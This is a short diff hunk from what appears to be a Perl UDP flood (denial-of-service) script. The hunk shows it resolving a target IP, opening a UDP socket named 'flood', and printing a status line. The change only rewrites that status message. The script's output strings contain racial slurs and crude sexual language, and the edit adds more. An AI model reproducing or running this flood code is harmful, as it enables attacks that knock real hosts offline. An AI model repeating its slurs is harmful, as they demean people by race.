@@ -14,7 +14,7 @@ $iaddr = inet_aton("$ip") or die "Cannot resolve nigger $ip\n";
 $endtime = time() + ($time ? $time : 100);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
       
-print "~niggering ip: $ip " . ($port ? $port : "random") . " With " .
+print "~niggering the ip: $ip " . ($port ? $port : "random") . " large cocks hitting " .
 ($size ? "$size-byte" : "niggered ?") . " " .
 ($time ? "for $time seconds" : "") . "\n";
   
